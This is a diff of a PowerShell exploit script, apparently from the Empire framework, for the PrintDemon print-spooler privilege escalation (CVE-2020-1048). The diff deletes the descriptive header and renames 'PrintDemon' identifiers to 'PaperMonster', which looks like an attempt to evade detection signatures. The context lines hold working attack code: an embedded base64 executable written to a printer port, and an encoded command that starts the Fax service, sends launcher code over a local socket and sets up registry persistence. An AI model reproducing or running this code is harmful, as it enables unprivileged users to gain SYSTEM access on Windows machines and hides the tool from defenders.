@@ -1,28 +1,4 @@
-function Invoke-PrintDemon {
-<#
-    .SYNOPSIS
-
-        This is an Empire launcher PoC using PrintDemon, the CVE-2020-1048
-        is a privilege escalation vulnerability that allows a persistent
-        threat through Windows Print Spooler. The vulnerability allows an
-        unprivileged user to gain system-level privileges. Based on
-        @ionescu007 PoC.
-
-        Author: @hubbl3, @Cx01N
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
-
-    .EXAMPLE
-
-        PS> Invoke-PrintDemon 'vAG4AUAB1CsAJABLACkAKQB8AEkARQBYAA=='
-
-    .LINK
-
-        https://github.com/ionescu007/PrintDemo
-        https://stackoverflow.com/questions/4442122/send-raw-zpl-to-zebra-printer-via-usb
-        https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1048
-#>
+function Invoke-PaperMonster {
 param(
      [Parameter()]
      [string]$LauncherCode
@@ -155,7 +131,7 @@ $PE =  [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAA
 
 [IntPtr] $unmanaged = ([system.runtime.interopservices.marshal]::AllocHGlobal($pe.Length));
 [system.runtime.interopservices.marshal]::Copy($PE, 0, $unmanaged, $PE.Length);
-[Printer.RawPrinterHelper]::SendBytesToPrinter("PrintDemon", $unmanaged, $PE.Length);
+[Printer.RawPrinterHelper]::SendBytesToPrinter("PaperMonster", $unmanaged, $PE.Length);
 
 $regcommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('sc.exe start Fax;$FTPServer = "localhost";$FTPPort = "9299";$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);$tcpStream = $tcpConnection.GetStream();$reader = New-Object System.IO.StreamReader($tcpStream);$writer = New-Object System.IO.StreamWriter($tcpStream);$writer.AutoFlush = $true;$commands = @( "DQA=",'''+ $LauncherCode + ''',"DQA=" );while ($tcpConnection.Connected){while ($tcpStream.DataAvailable){$reader.ReadLine()};if ($tcpConnection.Connected){For($i = 0; $i -lt 5; $i++){ForEach ($str in $commands){Start-Sleep -s 1;$command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($str));$writer.WriteLine($command) | Out-Null;};};break;};};$reader.Close();$writer.Close();$tcpConnection.Close();'));
 $RegPath = 'HKCU:Software\Microsoft\Windows\CurrentVersion\Debug';
